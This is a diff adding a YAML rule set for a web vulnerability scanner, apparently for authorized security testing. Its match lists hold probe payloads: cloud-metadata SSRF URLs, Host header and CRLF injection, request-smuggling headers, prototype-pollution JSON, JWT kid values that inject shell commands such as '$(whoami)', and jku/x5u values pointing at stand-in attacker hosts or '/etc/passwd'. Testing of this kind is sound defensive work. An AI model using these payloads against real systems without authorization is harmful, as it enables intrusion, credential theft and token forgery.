@@ -1,0 +1,281 @@
+metadata:
+  name: "Advanced Web Security Testing"
+  description: "Comprehensive security testing covering SSRF, HTTP methods, Host header injection, parameter pollution, request smuggling, CORS, prototype pollution, and JWT kid/JKU tests"
+  version: "1.0"
+  author: "Security Team"
+  tags: ["ssrf", "http-methods", "host-injection", "parameter-pollution", "request-smuggling", "cors", "prototype-pollution", "jwt"]
+
+rules:
+  # SSRF (Server-Side Request Forgery) Tests
+  - name: "SSRF - Internal IP Detection"
+    description: "Detect SSRF vulnerabilities by testing internal IP addresses"
+    match:
+      - "http://127.0.0.1"
+      - "http://localhost"
+      - "http://0.0.0.0"
+      - "http://10.0.0.1"
+      - "http://192.168.1.1"
+      - "http://172.16.0.1"
+      - "http://169.254.169.254"  # AWS metadata
+      - "http://169.254.169.253"  # Azure metadata
+      - "http://100.100.100.200"  # Alibaba Cloud metadata
+    severity: "high"
+    confidence: "medium"
+
+  - name: "SSRF - Cloud Metadata Services"
+    description: "Test for cloud metadata service access"
+    match:
+      - "http://169.254.169.254/latest/meta-data/"
+      - "http://169.254.169.254/latest/dynamic/instance-identity/"
+      - "http://169.254.169.253/metadata/instance"
+      - "http://100.100.100.200/latest/meta-data/"
+      - "http://metadata.google.internal/computeMetadata/v1/"
+      - "http://metadata.azure.internal/metadata/instance"
+    severity: "critical"
+    confidence: "high"
+
+  - name: "SSRF - Internal Services"
+    description: "Test for internal service access"
+    match:
+      - "http://127.0.0.1:22"
+      - "http://127.0.0.1:3306"
+      - "http://127.0.0.1:6379"
+      - "http://127.0.0.1:27017"
+      - "http://127.0.0.1:5432"
+      - "http://127.0.0.1:8080"
+      - "http://127.0.0.1:9000"
+    severity: "high"
+    confidence: "medium"
+
+  # HTTP Methods Testing
+  - name: "HTTP Methods - Dangerous Methods"
+    description: "Test for dangerous HTTP methods"
+    match:
+      - "OPTIONS"
+      - "TRACE"
+      - "TRACK"
+      - "DEBUG"
+      - "PUT"
+      - "DELETE"
+      - "PATCH"
+    severity: "medium"
+    confidence: "high"
+
+  - name: "HTTP Methods - Method Override"
+    description: "Test for HTTP method override techniques"
+    match:
+      - "X-HTTP-Method"
+      - "X-HTTP-Method-Override"
+      - "X-Method-Override"
+      - "X-HTTP-Method-Override: PUT"
+      - "X-HTTP-Method-Override: DELETE"
+    severity: "medium"
+    confidence: "medium"
+
+  # Host Header Injection
+  - name: "Host Header Injection - Basic"
+    description: "Test for Host header injection vulnerabilities"
+    match:
+      - "Host: evil.com"
+      - "Host: 127.0.0.1"
+      - "Host: localhost"
+      - "Host: internal-service"
+      - "Host: admin.internal"
+    severity: "high"
+    confidence: "medium"
+
+  - name: "Host Header Injection - Advanced"
+    description: "Advanced Host header injection tests"
+    match:
+      - "Host: evil.com\\r\\nX-Forwarded-For: 127.0.0.1"
+      - "Host: evil.com\\r\\nX-Forwarded-Host: internal"
+      - "Host: evil.com\\r\\nX-Original-URL: /admin"
+      - "Host: evil.com\\r\\nX-Rewrite-URL: /admin"
+    severity: "critical"
+    confidence: "high"
+
+  # Parameter Pollution
+  - name: "Parameter Pollution - Duplicate Parameters"
+    description: "Test for parameter pollution vulnerabilities"
+    match:
+      - "id=1&id=2"
+      - "user=admin&user=guest"
+      - "role=user&role=admin"
+      - "token=valid&token=invalid"
+    severity: "medium"
+    confidence: "medium"
+
+  - name: "Parameter Pollution - Array Parameters"
+    description: "Test for array parameter pollution"
+    match:
+      - "ids[]=1&ids[]=2"
+      - "users[]=admin&users[]=guest"
+      - "roles[]=user&roles[]=admin"
+    severity: "medium"
+    confidence: "medium"
+
+  # Request Smuggling
+  - name: "Request Smuggling - CL.TE"
+    description: "Test for CL.TE request smuggling"
+    match:
+      - "Content-Length: 0\\r\\nTransfer-Encoding: chunked"
+      - "Content-Length: 4\\r\\nTransfer-Encoding: chunked"
+    severity: "critical"
+    confidence: "medium"
+
+  - name: "Request Smuggling - TE.CL"
+    description: "Test for TE.CL request smuggling"
+    match:
+      - "Transfer-Encoding: chunked\\r\\nContent-Length: 0"
+      - "Transfer-Encoding: chunked\\r\\nContent-Length: 4"
+    severity: "critical"
+    confidence: "medium"
+
+  - name: "Request Smuggling - TE.TE"
+    description: "Test for TE.TE request smuggling"
+    match:
+      - "Transfer-Encoding: chunked\\r\\nTransfer-Encoding: identity"
+      - "Transfer-Encoding: identity\\r\\nTransfer-Encoding: chunked"
+    severity: "critical"
+    confidence: "medium"
+
+  # CORS Misconfiguration
+  - name: "CORS - Wildcard Origin"
+    description: "Test for wildcard CORS origin"
+    match:
+      - "Access-Control-Allow-Origin: *"
+      - "Access-Control-Allow-Origin: null"
+    severity: "high"
+    confidence: "high"
+
+  - name: "CORS - Credentials with Wildcard"
+    description: "Test for credentials with wildcard origin"
+    match:
+      - "Access-Control-Allow-Origin: *\\r\\nAccess-Control-Allow-Credentials: true"
+    severity: "critical"
+    confidence: "high"
+
+  - name: "CORS - Reflected Origin"
+    description: "Test for reflected origin in CORS"
+    match:
+      - "Access-Control-Allow-Origin: {ORIGIN}"
+    severity: "high"
+    confidence: "medium"
+
+  # Prototype Pollution
+  - name: "Prototype Pollution - Basic"
+    description: "Test for basic prototype pollution"
+    match:
+      - "__proto__[constructor][prototype]"
+      - "__proto__.constructor.prototype"
+      - "constructor[prototype]"
+      - "constructor.prototype"
+    severity: "high"
+    confidence: "medium"
+
+  - name: "Prototype Pollution - Advanced"
+    description: "Advanced prototype pollution tests"
+    match:
+      - "__proto__[isAdmin]=true"
+      - "__proto__[admin]=true"
+      - "constructor[prototype][isAdmin]=true"
+      - "__proto__[toString]=alert"
+    severity: "critical"
+    confidence: "medium"
+
+  - name: "Prototype Pollution - JSON"
+    description: "Prototype pollution in JSON payloads"
+    match:
+      - '{"__proto__":{"isAdmin":true}}'
+      - '{"constructor":{"prototype":{"isAdmin":true}}}'
+      - '{"__proto__":{"toString":"alert(1)"}}'
+    severity: "high"
+    confidence: "medium"
+
+  # JWT kid/JKU Tests
+  - name: "JWT - kid Header Injection"
+    description: "Test for JWT kid header injection"
+    match:
+      - '"kid":"../../../../../../dev/null"'
+      - '"kid":"|whoami"'
+      - '"kid":"$(whoami)"'
+      - '"kid":"`whoami`"'
+    severity: "critical"
+    confidence: "high"
+
+  - name: "JWT - jku Header Injection"
+    description: "Test for JWT jku header injection"
+    match:
+      - '"jku":"http://evil.com/jwks.json"'
+      - '"jku":"https://attacker.com/keys.json"'
+      - '"jku":"file:///etc/passwd"'
+    severity: "critical"
+    confidence: "high"
+
+  - name: "JWT - x5u Header Injection"
+    description: "Test for JWT x5u header injection"
+    match:
+      - '"x5u":"http://evil.com/cert.pem"'
+      - '"x5u":"https://attacker.com/certificate.pem"'
+      - '"x5u":"file:///etc/ssl/certs/ca-certificates.crt"'
+    severity: "critical"
+    confidence: "high"
+
+  - name: "JWT - Algorithm Confusion"
+    description: "Test for JWT algorithm confusion attacks"
+    match:
+      - '"alg":"none"'
+      - '"alg":"HS256"'
+      - '"alg":"RS256"'
+    severity: "high"
+    confidence: "medium"
+
+  - name: "JWT - Weak Secret"
+    description: "Test for JWT with weak secrets"
+    match:
+      - '"secret":"password"'
+      - '"secret":"123456"'
+      - '"secret":"admin"'
+      - '"secret":"test"'
+    severity: "medium"
+    confidence: "medium"
+
+filters:
+  - type: "url"
+    pattern: ".*\\.(css|js|png|jpg|jpeg|gif|ico|svg|woff|woff2|ttf|eot)$"
+    action: "exclude"
+
+  - type: "url"
+    pattern: ".*\\.(pdf|doc|docx|xls|xlsx|ppt|pptx)$"
+    action: "exclude"
+
+  - type: "url"
+    pattern: ".*/static/.*"
+    action: "exclude"
+
+  - type: "url"
+    pattern: ".*/assets/.*"
+    action: "exclude"
+
+  - type: "url"
+    pattern: ".*/images/.*"
+    action: "exclude"
+
+  - type: "url"
+    pattern: ".*/css/.*"
+    action: "exclude"
+
+  - type: "url"
+    pattern: ".*/js/.*"
+    action: "exclude"
+
+  - type: "url"
+    pattern: ".*/fonts/.*"
+    action: "exclude"
+
+settings:
+  max_requests_per_second: 10
+  timeout: 30
+  follow_redirects: true
+  verify_ssl: false
+  user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
